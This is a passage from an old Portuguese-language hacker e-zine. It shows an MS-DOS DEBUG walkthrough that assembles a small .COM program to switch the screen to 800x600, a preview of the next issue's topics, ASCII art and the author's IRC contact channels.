+c:\>DEBUG                 ; executamos o DEBUG do MS-DOS
+-A                        ; escrevemos o comando A de assemblar
+xxxx:0100 MOV AL,6A       ; carregamos AL = 6A
+xxxx:0102 INT 10          ; int 10 (video) com a função 6A (800x600)
+xxxx:0104 MOV AX,4C00     ; carregamos AX = 4C00
+xxxx:0107 INT 21          ; int 21 (DOS) com a func. 4C00 (sair do dos)
+xxxx:0109                 ; quando acabamos pressionamos <enter>
+-RIP			  ; comando RIP: mostra o conteudo do IP
+IP 0109			  ; IP = 0109
+:			  ; <enter> pra sair
+-RCX                      ; comando RCX: mostra o conteudo do CX
+CX 0000                   ; CX = 0000
+:09                       ; colocamos no CX o ultimo numero do IP(0109 == 09)
+                            Esse registro indica o tamanho do prog(em bytes).
+-N modelo1.com            ; comando N: colocar um nome no programa.
+-W                        ; comando W: compila e escreve o modelo1.COM
+Escribiendo 00009 bytes
+-Q                        ; comando Q: sai do DEBUG
+c:\>
+
+	O programa está criado. O que faz este programa é transformar a tela
+padrão do Prompt do DOS em uma tela de 800x600. Para testá-lo apenas digite
+modelo1.
+
+	Na próxima edição se prepare pois vamos começar a pratica crack em
+cima desse programa simples.
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$ 10. Preview $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+	Na próxima edição...
+
+* Kevin Mitnick			'A ultima parte da história de Mitnick;
+* Phreaking			'Mais programação em celulares;
+* Bugz				'Quem sabe o q nos espera;
+* Hacking para iniciantes	'Grossario de termos usados por hackers;
+* Cracker'z			'Começando o cracking;
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+                FFFFFFFFFFFF  IIII  NNNN        NNN
+                FFFFFFFFFFFF  IIII  NNNNNN      NNN
+                FFFF                NNN NNN     NNN
+                FFFF          IIII  NNN  NNN    NNN
+                FFFFFFFFFFFF  IIII  NNN   NNN   NNN
+                FFFFFFFFFFFF  IIII  NNN    NNN  NNN
+                FFFF          IIII  NNN     NNN NNN
+                FFFF          IIII  NNN      NNNNNN
+                FFFF          IIII  NNN       NNNNN
+                FFFF          IIII  NNN        NNNN
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+        Este zine é escrito por Cheat Struck.
+        No e-mail;
+        No page;
+        No ICQ;
+        No IP fixed;
+        A unica maneira de me acharem na inet é:
+        server  irc.via-rs.com.br:6667
+        canal   #via-rs
+                #hackers
+                #senhas
+        Quando  Sextas e Sabados(raramente) das 12:00 as 6:00
